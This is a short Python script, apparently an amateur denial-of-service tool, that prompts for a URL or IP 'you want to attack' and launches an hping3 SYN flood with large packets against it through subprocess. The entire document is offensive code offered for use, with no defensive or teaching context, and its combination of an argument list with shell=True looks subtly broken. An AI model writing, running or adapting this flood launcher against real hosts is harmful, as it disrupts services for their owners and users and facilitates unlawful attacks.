
import subprocess

url = input("enter url or IP you want to attack: ")
print("ENTER COMMAND hping3 -d 5000 -S --flood", url)
subprocess.run(["hping3", "-d 5000" ,"-S", "--flood",url], shell=True )
